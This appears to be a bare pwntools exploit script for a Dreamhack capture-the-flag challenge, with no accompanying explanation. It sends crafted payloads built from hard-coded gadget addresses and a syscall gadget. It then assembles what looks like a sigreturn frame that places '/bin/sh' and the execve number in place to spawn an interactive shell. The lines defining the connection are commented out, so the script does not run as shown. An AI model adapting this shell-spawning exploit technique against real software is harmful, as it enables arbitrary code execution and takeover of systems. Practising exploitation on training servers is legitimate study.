from pwn import *

#p = process("prob")
#p = remote("host3.dreamhack.games", 22490)
cmd="""
init-pwndbg
"""
gdb.attach(p, cmd)
for i in range(0,0x30):
    x = 0 #0xdeadbeef00000000 + i
    if i==24:
        x = 0x33
    if i==21:
        x = 0x2b
    if i==0x1a:
        x =  0x4010DD#0x4010DD # syscall
    if i==0x1b:
        x = 0x0000000000402508 #dummy
    if i==0x20:
        x = 0x0000000000402508 #dummy
    if i==0x21:
        x = 0x0000000000402500 #dummy
    if i==0x1e:
        x = 0x300
    pay = b''
    pay += p64(0x401005)
    pay += p64(0x00000000004010e1)
    pay += p64(0x00000000004010e1)
    pay += p64(x)

    p.send(pay)

pay = b''
pay += b'a'*0x10
pay += p64(0x40108C)
pay += p64(0x4010DD)

p.send(pay)

pay = b'/bin/sh\x00'
pay += p64(0x40108C)
pay += p64(0x4010DD)

for i in range(0x16):
    if i==0x12:
        pay += p64(0x3b)
    elif i==0x14 or i==0xd:
        pay += p64(0x0000000000402500)
    elif i==0x15:
        pay += p64(0x4010DD)
    else:
        pay += p64(0x0)
pay += p64(0x0)
pay += p64(0x33)
pay += p64(0x0)
pay += p64(0x0)
pay += p64(0x2b)

pause()
p.sendline(pay)

p.interactive()
